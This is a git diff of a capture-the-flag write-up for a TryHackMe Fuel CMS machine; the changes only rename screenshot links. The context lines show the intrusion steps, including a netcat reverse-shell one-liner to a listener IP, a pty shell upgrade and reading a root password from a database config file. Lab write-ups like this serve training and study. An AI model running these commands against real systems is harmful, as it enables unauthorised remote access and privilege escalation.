@@ -8,12 +8,12 @@ For more detailed writeup - [tryhackme_official_writeup](https://tryhackme.com/r
 ## Lets start
 
 *Firstly we did an nmap scan on the victim ip*
-![[Pasted image 20260217004003.png]]
+![[1.png]]
 
 Here we found that it was serving on the port 80 which means it is an webapp.
 
 Next I tried to check if there is an robots.txt and guess what, it was there
-![[Pasted image 20260217004236.png]]
+![[2.png]]
 
 Here we found there was /fuel/ directory in the website.After we accessed that page so there  was an login form and i dont know the password so i didnt tried to bruteforce.But later in the homepage I found username: admin and password: admin , but there  was no need of admin.
 
@@ -53,7 +53,7 @@ while 1:
 ```
 
 Then I ran the python code and got the shell to execute the commands.
-![[Pasted image 20260217004932.png]]
+![[3.png]]
 
 **NOTE**: Make sure to give input with "" i.e when you run the exploit you'll get cmd: and there you'll have to enter the command you want to execute. Ex: Say you want to run ls then do cmd: "ls" and not cmd: ls. Notice the quotation marks around the command.
 
@@ -64,7 +64,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f
 ```
 
 This will give you a reverse shell on your listener which should be listening on port 4444 via nc -nlvp 4444.
-![[Pasted image 20260217005121.png]]
+![[4.png]]
 
 *One thing we have to do is setting up terminal enviornment in our terminal.Do this:*
 ```shell
@@ -73,14 +73,14 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 
 Now we can get into the /home to get user flag.
-![[Pasted image 20260217005200.png]]
+![[5.png]]
 
 ## Privilege escalation
 
 After looking around for a little bit, I found the password for root: `/var/www/html/fuel/application/config/database.php`.
 
-![[Pasted image 20260217005246.png]]
+![[6.png]]
 
 Now we found the root password which is `mememe` .
 
-![[Pasted image 20260217005520.png]]
+![[7.png]]
